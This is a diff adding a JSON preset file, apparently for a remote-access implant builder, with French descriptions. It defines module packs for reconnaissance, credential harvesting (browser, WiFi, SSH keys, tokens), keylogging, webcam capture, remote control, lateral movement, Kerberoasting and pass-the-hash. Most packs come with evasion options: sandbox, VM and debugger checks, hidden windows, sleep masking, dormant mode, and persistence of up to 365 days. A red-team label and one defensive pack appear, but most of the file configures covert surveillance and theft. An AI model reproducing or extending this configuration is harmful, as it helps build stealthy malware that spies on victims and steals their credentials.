@@ -1,0 +1,118 @@
+{
+  "packs": [
+    {
+      "id": "recon",
+      "name": "Recon Pack",
+      "description": "Léger : reconnaissance système, réseau et navigateur. Peu bruyant, idéal pour un premier contact.",
+      "icon": "🗺",
+      "tags": ["recon", "lightweight", "quiet"],
+      "modules": ["info", "shell", "file", "wifi", "browser", "port_scan"],
+      "build_options": {
+        "anti_analysis": true,
+        "persistence": false,
+        "hide_window": true,
+        "vm_check": true,
+        "debugger_check": true,
+        "sandbox_check": true,
+        "beacon_jitter": true,
+        "ttl_days": 3
+      }
+    },
+    {
+      "id": "fbox",
+      "name": "FBOX Control Pack",
+      "description": "Pack local FBOX : contrôle complet, stream, remote, shell, screenshot, keylog, webcam, fichiers, WiFi, et persistance.",
+      "icon": "🖥",
+      "tags": ["fbox", "local", "remote-control", "screen-stream"],
+      "modules": ["info", "shell", "file", "screenshot", "screen_stream", "remote_control", "keylog", "wifi", "webcam", "clipboard", "browser", "process", "anti_analysis", "stealth", "persistence"],
+      "build_options": {
+        "anti_analysis": true,
+        "persistence": true,
+        "hide_window": true,
+        "vm_check": false,
+        "debugger_check": false,
+        "sandbox_check": false,
+        "beacon_jitter": false,
+        "single_execution": false,
+        "self_destruct": false,
+        "dormant_mode": true,
+        "dormant_sleep_minutes": 30,
+        "ttl_days": 365
+      }
+    },
+    {
+      "id": "stealth",
+      "name": "Stealth Pack",
+      "description": "Furtivité maximale : anti-analyse, sleep mask, jitter, dormant mode. Pour les opérations longue durée.",
+      "icon": "🌑",
+      "tags": ["stealth", "evasion", "long-term"],
+      "modules": ["info", "shell", "file", "screenshot", "keylog", "browser", "wifi", "anti_analysis", "stealth", "sleep_mask"],
+      "build_options": {
+        "stealth_pack": true,
+        "anti_analysis": true,
+        "persistence": false,
+        "hide_window": true,
+        "vm_check": true,
+        "debugger_check": true,
+        "sandbox_check": true,
+        "beacon_jitter": true,
+        "dormant_mode": true,
+        "dormant_sleep_minutes": 60,
+        "ttl_days": 30
+      }
+    },
+    {
+      "id": "credentials",
+      "name": "Credential Harvest Pack",
+      "description": "Ciblé sur l'extraction de credentials : navigateurs, WiFi, Credential Manager, SSH keys, env secrets.",
+      "icon": "🔑",
+      "tags": ["credentials", "harvest"],
+      "modules": ["info", "browser", "wifi", "credential_dump", "clipboard", "keylog", "token"],
+      "build_options": {
+        "anti_analysis": true,
+        "persistence": false,
+        "hide_window": true,
+        "vm_check": true,
+        "debugger_check": true,
+        "beacon_jitter": true,
+        "ttl_days": 7
+      }
+    },
+    {
+      "id": "redteam-full",
+      "name": "Red Team Full Pack",
+      "description": "Pack complet avec tous les modules classiques : recon, creds, persistence, mouvement latéral, exfil.",
+      "icon": "🚀",
+      "tags": ["red-team", "full", "apt-simulation"],
+      "modules": ["info", "shell", "file", "screenshot", "keylog", "browser", "wifi", "webcam", "clipboard", "persistence", "port_scan", "anti_analysis", "stealth", "injection", "lateral", "pivoting", "kerberoast", "pth"],
+      "build_options": {
+        "anti_analysis": true,
+        "persistence": true,
+        "hide_window": true,
+        "vm_check": true,
+        "debugger_check": true,
+        "sandbox_check": true,
+        "beacon_jitter": true,
+        "ttl_days": 14
+      }
+    },
+    {
+      "id": "defensive-audit",
+      "name": "Defensive Audit Pack",
+      "description": "Pour audit défensif : collecte d'informations système, configurations et preuves sans modules offensifs actifs.",
+      "icon": "🛡",
+      "tags": ["defensive", "audit", "compliance"],
+      "modules": ["info", "shell", "file"],
+      "build_options": {
+        "anti_analysis": false,
+        "persistence": false,
+        "hide_window": false,
+        "vm_check": false,
+        "debugger_check": false,
+        "sandbox_check": false,
+        "beacon_jitter": false,
+        "ttl_days": 1
+      }
+    }
+  ]
+}
